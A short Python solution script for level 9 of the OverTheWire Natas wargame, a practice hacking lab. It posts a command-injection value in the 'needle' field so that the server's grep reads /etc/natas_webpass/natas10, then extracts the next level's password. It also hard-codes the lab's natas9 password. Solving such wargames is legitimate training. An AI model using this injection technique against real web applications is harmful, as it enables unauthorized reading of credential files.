#!/user/bin/env python
import requests
import  re
username = 'natas9'
password = 'Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd'



url ='http://%s.natas.labs.overthewire.org/' % username
session = requests.Session()
#reponse = requests.get(url , auth = (username, password)
reponse = session.post(url ,data={"needle":". /etc/natas_webpass/natas10 #", "submit" :"submit"} , auth = (username, password))


content = reponse.text

print (content)
print (re.findall('<pre>\n(.*)\n</pre>',content)[0])
